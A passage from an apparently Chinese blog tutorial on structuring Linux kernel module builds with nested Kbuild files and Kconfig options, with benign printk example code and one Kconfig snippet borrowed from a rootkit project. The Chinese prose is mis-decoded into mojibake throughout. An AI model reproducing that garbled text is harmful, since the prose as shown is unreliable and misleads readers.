¹ç›®å½•ï¼ˆåé¢æˆ‘ä»¬ä¼šè§£é‡Šä¸ºä»€ä¹ˆï¼‰ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># SPDX-License-Identifier: GPL-2.0</span><br><br><span class="hljs-variable">$(MODULE_NAME)</span>-y += sub/sub_sub/sub_sub.o<br></code></pre></td></tr></table></figure><p>åœ¨ <code>src/sub/sub_sub/sub_sub.c</code> å½“ä¸­æˆ‘ä»¬ç®€å•å®šä¹‰ä¸€ä¸ªæ‰“å°å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Copyright (c) 2025 arttnba3 &lt;arttnba@gmail.com&gt;</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * This work is licensed under the terms of the GNU GPL, version 2 or later.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">foo_sub_sub</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Here&#x27;s the sub_sub!\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åæ˜¯ <code>src/sub</code> ç›®å½•ï¼Œæˆ‘ä»¬ä½¿ç”¨ <code>Kbuild</code> æ–‡ä»¶é…ç½®è¿™ä¸ªå­ç›®å½•ä¸‹éœ€è¦ç¼–è¯‘çš„æ–‡ä»¶ï¼ŒåŒæ ·æ˜¯ä»¥æºç æ ¹ç›®å½•æ–‡ä»¶ä½œä¸ºç›¸å¯¹æ ¹ç›®å½•æ¥åŒ…å«å…¥å’±ä»¬çš„ <code>sub.c</code> æºç æ–‡ä»¶ï¼Œä½†åœ¨æ­¤ä¹‹å¤–æˆ‘ä»¬é¢å¤–åœ°ä½¿ç”¨ <code>include</code> è¯­å¥<strong>å°† sub_sub ç›®å½•çš„ Kbuild æ–‡ä»¶åŒ…å«åˆ°è¯¥æ–‡ä»¶å½“ä¸­</strong>ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># SPDX-License-Identifier: GPL-2.0</span><br><br><span class="hljs-variable">$(MODULE_NAME)</span>-y += sub/sub.o<br><br><span class="hljs-keyword">include</span> <span class="hljs-variable">$(src)</span>/sub/sub_sub/Kbuild<br></code></pre></td></tr></table></figure><p>åœ¨ <code>src/sub/sub.c</code> å½“ä¸­æˆ‘ä»¬åŒæ ·ç®€å•å®šä¹‰ä¸€ä¸ªæ‰“å°å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Copyright (c) 2025 arttnba3 &lt;arttnba@gmail.com&gt;</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * This work is licensed under the terms of the GNU GPL, version 2 or later.</span><br><span class="hljs-comment">**/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-type">void</span> <span class="hljs-title function_">foo_sub_sub</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">foo_sub</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Here&#x27;s the sub!\n&quot;</span>);<br>    foo_sub_sub();<br>&#125;<br> <br></code></pre></td></tr></table></figure><p>ç°åœ¨å¤§å®¶åº”è¯¥æ˜ç™½ä¸ºä»€ä¹ˆä»¥æºç æ ¹ç›®å½•æ–‡ä»¶ä½œä¸ºç›¸å¯¹æ ¹ç›®å½•ï¼Œå› ä¸ºæˆ‘ä»¬æœ€ç»ˆè¦åœ¨æºç æ ¹ç›®å½•ä¸‹çš„ <code>Kbuild</code> æ–‡ä»¶å½“ä¸­ <code>include</code> ä¸‹ä¸€çº§å­ç›®å½•çš„ <code>Kbuild</code> æ–‡ä»¶ï¼Œ<strong>é€šè¿‡å¤šçº§åŒ…å«çš„æ–¹å¼å®Œæˆå¤šçº§ Kbuild çš„é…ç½®</strong> ï¼Œæ ¹ç›®å½•ä¸‹çš„ Kbuild ä¾¿<strong>ä»…éœ€è¦åŒ…å«æ¬¡ä¸€çº§å­ç›®å½•çš„ Kbuild æ–‡ä»¶</strong>ï¼Œè€Œæ— éœ€å†å»ç®¡ç†æ›´ç»†çš„ç»†èŠ‚ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># module name</span><br>MODULE_NAME ?= a3kmod<br>obj-m += <span class="hljs-variable">$(MODULE_NAME)</span>.o<br><br><span class="hljs-comment"># compiler flags</span><br>ccflags-y += -I<span class="hljs-variable">$(src)</span>/<span class="hljs-keyword">include</span><br><br><span class="hljs-comment"># entry point</span><br><span class="hljs-variable">$(MODULE_NAME)</span>-y += main.o<br><br><span class="hljs-comment"># sub directory</span><br><span class="hljs-keyword">include</span> <span class="hljs-variable">$(src)</span>/sub/Kbuild<br><br></code></pre></td></tr></table></figure><h2 id="ä½¿ç”¨-Kconfig-é…ç½®åŠ¨æ€ç¼–è¯‘é€‰é¡¹"><a href="#ä½¿ç”¨-Kconfig-é…ç½®åŠ¨æ€ç¼–è¯‘é€‰é¡¹" class="headerlink" title="ä½¿ç”¨ Kconfig é…ç½®åŠ¨æ€ç¼–è¯‘é€‰é¡¹"></a>ä½¿ç”¨ Kconfig é…ç½®åŠ¨æ€ç¼–è¯‘é€‰é¡¹</h2><p>ç°åœ¨æˆ‘ä»¬æ¥çœ‹ <a href="https://docs.kernel.org/kbuild/kconfig-language.html">Kconfig</a> â€”â€”å†…æ ¸çš„ç¼–è¯‘é€‰é¡¹é…ç½®ç³»ç»Ÿï¼Œåœ¨æˆ‘ä»¬ç¼–è¯‘å†…æ ¸æ—¶é€šå¸¸éœ€è¦å…ˆ <code>make menuconfig</code> åˆ›å»ºé…ç½®æ–‡ä»¶ <code>.config</code> ï¼Œå…¶ä¸­ä¾¿åŒ…å«äº†é…ç½®é€‰é¡¹ï¼Œè¿™äº›é€‰é¡¹ä¼šè¢« Kconfig ç³»ç»Ÿè§£æç»™ç¼–è¯‘å™¨ï¼Œé€šè¿‡å®å®šä¹‰çš„æ–¹å¼ä½œç”¨äºæºä»£ç ï¼Œä¾‹å¦‚ä¸‹é¢è¿™ä¸ªé…ç½®å†³å®šäº†æ˜¯å¦å¯ç”¨ procfs æ–‡ä»¶ç³»ç»Ÿï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">CONFIG_PROC_FS</span>=y<br></code></pre></td></tr></table></figure><p>åœ¨å†…æ ¸æˆ–æ˜¯é©±åŠ¨æºç ä¸­ä¾¿å¯ä»¥æ ¹æ®æ˜¯å¦å®šä¹‰äº† <code>CONFIG_PROC_FS</code> å®æ¥å†³å®šæ˜¯å¦å°† procfs ç›¸å…³çš„ä»£ç ç¼–è¯‘è¿›æ¥ï¼Œä»¥ <code>arch/arm/kernel/dma.c</code> ä¸ºä¾‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_PROC_FS</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">proc_dma_show</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v)</span><br>&#123;<br><span class="hljs-type">int</span> i;<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span> ; i &lt; MAX_DMA_CHANNELS ; i++) &#123;<br><span class="hljs-type">dma_t</span> *dma = dma_channel(i);<br><span class="hljs-keyword">if</span> (dma &amp;&amp; dma-&gt;lock)<br>seq_printf(m, <span class="hljs-string">&quot;%2d: %s\n&quot;</span>, i, dma-&gt;device_id);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> __init <span class="hljs-title function_">proc_dma_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>proc_create_single(<span class="hljs-string">&quot;dma&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, proc_dma_show);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>__initcall(proc_dma_init);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>Kconfig é…ç½®æ–‡ä»¶åˆ™é€šè¿‡ Kconfig æºæ–‡ä»¶è¿›è¡Œç”Ÿæˆï¼Œè¿™ç±»æ–‡ä»¶çš„è¯­æ³•å®šä¹‰å‚è§ <a href="https://docs.kernel.org/kbuild/kconfig-language.html">Kconfig Language</a> ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªæ¥è‡ª <a href="https://github.com/arttnba3/Nornir-Rootkit">Nornir-Rootkit</a> é¡¹ç›®çš„ç®€å•çš„ä¾‹å­ï¼Œå…¶å®šä¹‰äº†ä¸€ä¸ªç¼–è¯‘é€‰é¡¹ <code>CONFIG_NORNIR_PROCFS_UAPI</code> ï¼Œé»˜è®¤å€¼ä¸º <code>=y</code> ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs kconfig">config NORNIR_PROCFS_UAPI<br>    bool &quot;Enable user interface under /proc&quot;<br>    default y<br>    help <br>        Create a node `/proc/nornir` as a user interface<br></code></pre></td></tr></table></figure><p>åœ¨å®é™…å·¥ç¨‹ä¸­çš„ Kconfig æ–‡ä»¶é€šå¸¸æ›´åŠ å¤æ‚ï¼ŒåŒ…æ‹¬å¤šçº§çš„é€‰é¡¹èœå•å®šä¹‰ï¼Œè¿™é€šå¸¸æ˜¯ä¸ºäº†å®ç°ä¸€ä¸ªæ¯”è¾ƒå‹å¥½çš„ç”¨æˆ·èœå•ï¼Œè¿™é‡Œæˆ‘ä»¬ä¾æ—§ä»¥ <a href="https://github.com/arttnba3/Nornir-Rootkit">Nornir-Rootkit</a> é¡¹ç›®ä¸ºä¾‹ï¼Œå…¶åŸºäº <a href="https://github.com/espressif/kconfig-frontends">kconfig-frontends</a> é¡¹ç›®ï¼ˆä»å†…æ ¸ Kconfig ç³»ç»Ÿä¸­æ‹†åˆ†å‡ºæ¥çš„ç‹¬ç«‹é¡¹ç›®ï¼Œä¸è¿‡å·²å¹´ä¹…å¤±ä¿®ï¼‰çš„å›¾å½¢åŒ– Kconfig çš„é…ç½®ç•Œé¢å¦‚ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2025/02/25/tGJEH4reK71mych.png"></p><blockquote><p>æ³¨ï¼šè™½ç„¶ fork å‡ºæ¥çš„ <a href="https://github.com/espressif/kconfig-frontends">kconfig-frontends</a> é¡¹ç›®å·²ç»å¹´ä¹…å¤±ä¿®ï¼Œä½†æˆ‘ä»¬ä¾ç„¶èƒ½ç”¨ä¸€äº›å…¶ä»–çš„å¼€æº Kconfig æ”¯æŒé¡¹ç›®ï¼ˆæˆ–æ˜¯è‡ªå·±å†ä»å†…æ ¸é‡Œæ‹†åˆ†ä¸€ä¸‹ï¼‰æ¥ä¸ºæˆ‘ä»¬çš„ä»£ç ä½¿ç”¨ Kconfig è¿›è¡Œé…ç½®</p></blockquote><p>å½“ Kconfig ç³»ç»Ÿå®Œæˆ Kconfig é…ç½®æ–‡ä»¶çš„è§£è¯»ä¸è®¾å®šä¹‹åï¼Œé€šå¸¸ä¼šç”Ÿæˆä¸€ä»½æ­£å¼çš„é…ç½®æ–‡ä»¶ï¼Œå…¶ä¸­ç»™å‡ºäº†å„ä¸ªé…ç½®çš„å€¼ï¼Œå¯¹äº Linux kernel è€Œè¨€è¿™é€šå¸¸æ˜¯æºç ç›®å½•ä¸‹çš„ <code>.config</code> æ–‡ä»¶ï¼Œä»¥ IRQ å­ç³»ç»Ÿä¸ºä¾‹ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment">#</span><br><span class="hljs-comment"># IRQ subsystem</span><br><span class="hljs-comment">#</span><br>CONFIG_GENERIC_IRQ_PROBE=y<br>CONFIG_GENERIC_IRQ_SHOW=y<br>CONFIG_GENERIC_IRQ_EFFECTIVE_AFF_MASK=y<br>CONFIG_GENERIC_PENDING_IRQ=y<br>CONFIG_GENERIC_IRQ_MIGRATION=y<br></code></pre></td></tr></table></figure><p>ä¸‹é¢æˆ‘ä»¬æ”¹è¿›ä¸€ä¸‹ä¸Šé¢çš„çš„ä»£ç ç»“æ„ï¼Œæ·»åŠ ä¸€ä¸ªæˆ‘ä»¬è‡ªå·±çš„ Kconfig æ–‡ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tree .</span><br>.<br>â”œâ”€â”€ Makefile<br>â””â”€â”€ src<br>    â”œâ”€â”€ Kbuild<br>    â”œâ”€â”€ Kconfig<br>    â”œâ”€â”€ main.c<br>    â””â”€â”€ sub<br>        â”œâ”€â”€ Kbuild<br>        â”œâ”€â”€ sub.c<br>        â””â”€â”€ sub_sub<br>            â”œâ”€â”€ Kbuild<br>            â””â”€â”€ sub_sub.c<br><br>4 directories, 8 files<br></code></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ª Kconfig å½“ä¸­ï¼Œæˆ‘ä»¬é…ç½®ä¸€ä¸ªäºŒçº§èœå•ï¼Œä»¥åŠä¸¤ä¸ªç¼–è¯‘é…ç½®é€‰é¡¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs kconfig">mainmenu &quot;A3KMOD Test Configuration&quot;<br><br>menu &quot;First-level sub directory&quot;<br><br>    config ENABLE_SUB<br>        bool &quot;Enable first-level sub directory&quot;<br>        default y<br><br>    menu &quot;Second-level sub directory&quot;<br>        depends on ENABLE_SUB<br><br>        config ENABLE_SUB_SUB<br>        bool &quot;Enable second-level sub directory&quot;<br>        default y<br><br>    endmenu<br><br>endmenu<br></code></pre></td></tr></table></figure><p>ä¸‹é¢æˆ‘ä»¬ä½¿ç”¨ <a href="https://pypi.org/project/kconfiglib/#history">kconfiglib</a> æ¥æ¼”ç¤ºé…ç½®æ–‡ä»¶çš„ç”Ÿæˆï¼Œå¯¹äºä¸Šé¢çš„é…ç½®æ–‡ä»¶æˆ‘ä»¬æœ‰è¿™æ ·ä¸€ä¸ªç®€å•çš„äºŒçº§èœå•å…¥å£ï¼Œå…¶ä¸­ç¬¬äºŒçº§èœå•ä¾èµ–äºç¬¬ä¸€çº§èœå•çš„å¼€å¯ï¼š</p><p><img src="https://s2.loli.net/2025/02/25/JtBSgapyAjmvFQb.png"></p><p>æˆ‘ä»¬æ§åˆ¶ç¬¬ä¸€çº§èœå•å¼€å¯ï¼Œè€Œç¬¬äºŒçº§èœå•ä¸å¼€å¯ï¼Œç”Ÿæˆçš„ <code>.config</code> æ–‡ä»¶å¦‚ä¸‹ï¼š</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><br><span class="hljs-meta">#</span><br><span class="hljs-meta"># First-level sub directory</span><br><span class="hljs-meta">#</span><br>CONFIG_ENABLE_SUB=y<br><br><span class="hljs-meta">#</span><br><span class="hljs-meta"># Second-level sub directory</span><br><span class="hljs-meta">#</span><br><span class="hljs-meta"># CONFIG_ENABLE_SUB_SUB is not set</span><br><span class="hljs-meta"># <span class="hljs-keyword">end</span> of Second-level sub directory</span><br><span class="hljs-meta"># <span class="hljs-keyword">end</span> of First-level sub directory</span><br><br></code></pre></td></tr></table></figure><p>å’Œå‰é¢ç±»ä¼¼ï¼Œæˆ‘ä»¬é€šè¿‡æ–‡ä»¶åŒ…å«çš„å½¢å¼å°†ç”Ÿæˆçš„ <code>.config</code> é…ç½®æ–‡ä»¶çº³å…¥åˆ°æˆ‘ä»¬çš„ç¼–è¯‘ä½“ç³»å½“ä¸­ï¼Œæˆ‘ä»¬å°†  <code>src/Kbuild</code>  ä¿®æ”¹å¦‚ä¸‹ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># module name</span><br>MODULE_NAME ?= a3kmod<br>obj-m += <span class="hljs-variable">$(MODULE_NAME)</span>.o<br><br><span class="hljs-comment"># compiler flags</span><br>ccflags-y += -I<span class="hljs-variable">$(src)</span>/<span class="hljs-keyword">include</span><br><br><span class="hljs-comment"># custom config options</span><br><span class="hljs-keyword">include</span> <span class="hljs-variable">$(src)</span>/../.config<br><br><span class="hljs-comment"># entry point</span><br><span class="hljs-variable">$(MODULE_NAME)</span>-y += main.o<br><br><span class="hljs-comment"># sub directory</span><br><span class="hljs-keyword">include</span> <span class="hljs-variable">$(src)</span>/sub/Kbuild<br></code></pre></td></tr></table></figure><p>åœ¨ <code>src/sub/Kbuild</code> å½“ä¸­ï¼Œæˆ‘ä»¬é€šè¿‡ <code>$(æ¨¡å—å)-(é€‰é¡¹å)</code> çš„æ–¹å¼ <strong>æ§åˆ¶æºæ–‡ä»¶çš„ç¼–è¯‘</strong> ï¼Œé€šè¿‡ <code>ccflags-$(é€‰é¡¹å) += -Dé€‰é¡¹å</code> çš„æ–¹å¼æ¥<strong>åœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­åŠ¨æ€å®šä¹‰è¯¥å®</strong> ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># SPDX-License-Identifier: GPL-2.0</span><br><br><span class="hljs-variable">$(MODULE_NAME)</span>-<span class="hljs-variable">$(CONFIG_ENABLE_SUB)</span> += sub/sub.o<br>ccflags-<span class="hljs-variable">$(CONFIG_ENABLE_SUB)</span> += -DCONFIG_ENABLE_SUB<br><br><span class="hljs-keyword">include</span> <span class="hljs-variable">$(src)</span>/sub/sub_sub/Kbuild<br></code></pre></td></tr></table></figure><blockquote><p>å½“ç„¶ï¼Œé™¤äº†è¿™ä¸ªæ–¹å¼ä»¥å¤–ï¼Œkconfiglib å…¶å®è¿˜æä¾›äº†ç”ŸæˆåŒ…å«æˆ‘ä»¬é…ç½®çš„ <code>config.h</code> æ–‡ä»¶çš„åŠŸèƒ½ï¼Œä»è€Œèƒ½å¤Ÿè¢«æ›´æ–¹ä¾¿åœ°æ•´åˆåˆ°ä»£ç ç»“æ„å½“ä¸­ï¼Œä½†è¿™éœ€è¦æˆ‘ä»¬ä¸ºä»£ç å¼•å…¥é¢å¤–çš„å¤´æ–‡ä»¶ï¼ŒæŸç§ç¨‹åº¦ä¸Šç ´åäº†ä»£ç ç»“æ„ï¼Œå› æ­¤ç¬”è€…æ›´å–œæ¬¢é€šè¿‡ç¼–è¯‘å‚æ•°æ·»åŠ å˜é‡çš„æ–¹å¼ï¼šï¼‰</p></blockquote><p>æˆ‘ä»¬å°† <code>src/main.c</code> ä¿®æ”¹å¦‚ä¸‹ï¼Œä»¥åˆ¤å®šæ˜¯å¦å¼•å…¥å¯¹åº”å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Copyright (c) 2025 arttnba3 &lt;arttnba@gmail.com&gt;</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * This work is licensed under the terms of the GNU GPL, version 2 or later.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/module.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/init.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_ENABLE_SUB</span><br>    <span class="hljs-keyword">extern</span> <span class="hljs-type">void</span> <span class="hljs-title function_">foo_sub</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">static</span> __init <span class="hljs-type">int</span> <span class="hljs-title function_">a3kmod_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Hello kernel world!\n&quot;</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_ENABLE_SUB</span><br>    foo_sub();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">static</span> __exit <span class="hljs-type">void</span> <span class="hljs-title function_">a3kmod_exit</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Goodbye kernel world!\n&quot;</span>);<br>&#125;<br><br>module_init(a3kmod_init);<br>module_exit(a3kmod_exit);<br>MODULE_AUTHOR(<span class="hljs-string">&quot;arttnba3&quot;</span>);<br>MODULE_LICENSE(<span class="hljs-string">&quot;GPL v2&quot;</span>);<br><br></code></pre></td></tr></table></figure><p>å¯¹äº  <code>src/sub/sub_sub/Kbuild</code>  æˆ‘ä»¬åŒæ ·è¿›è¡Œè¿™æ ·çš„ä¿®æ”¹ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-comment"># SPDX-License-Identifier: GPL-2.0</span><br><br><span class="hljs-variable">$(MODULE_NAME)</span>-<span class="hljs-variable">$(CONFIG_ENABLE_SUB_SUB)</span> += sub/sub_sub/sub_sub.o<br>ccflags-<span class="hljs-variable">$(CONFIG_ENABLE_SUB_SUB)</span> += -DCONFIG_ENABLE_SUB_SUB<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å°† <code>src/sub/sub.c</code> ä¿®æ”¹ä¸ºå¦‚ä¸‹ï¼Œä»¥åˆ¤å®šæ˜¯å¦å¼•å…¥è¯¥å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Copyright (c) 2025 arttnba3 &lt;arttnba@gmail.com&gt;</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * This work is licensed under the terms of the GNU GPL, version 2 or later.</span><br><span class="hljs-comment">**/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/kernel.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_ENABLE_SUB_SUB</span><br>    <span class="hljs-keyword">extern</span> <span class="hljs-type">void</span> <span class="hljs-title function_">foo_sub_sub</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">foo_sub</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    printk(KERN_INFO <span class="hljs-string">&quot;[a3kmod:] Here&#x27;s the sub!\n&quot;</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_ENABLE_SUB_SUB</span><br>    foo_sub_sub();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br> <br></code></pre></td></tr></table></figure><p>ç¼–è¯‘è½½å…¥ï¼Œå¯ä»¥çœ‹åˆ°ç¡®å®æ²¡æœ‰è°ƒç”¨äºŒçº§ç›®å½•çš„ <code>foo_sub_sub()</code> å‡½æ•°ï¼š</p><p><img src="https://s2.loli.net/2025/02/25/B4aQLRM29JiyhZt.png"></p><p>é‡æ–°é…ç½® <code>.config</code> ï¼Œå¼€å¯ <code>CONFIG_ENANLE_SUB_SUB</code> é€‰é¡¹ï¼š</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs 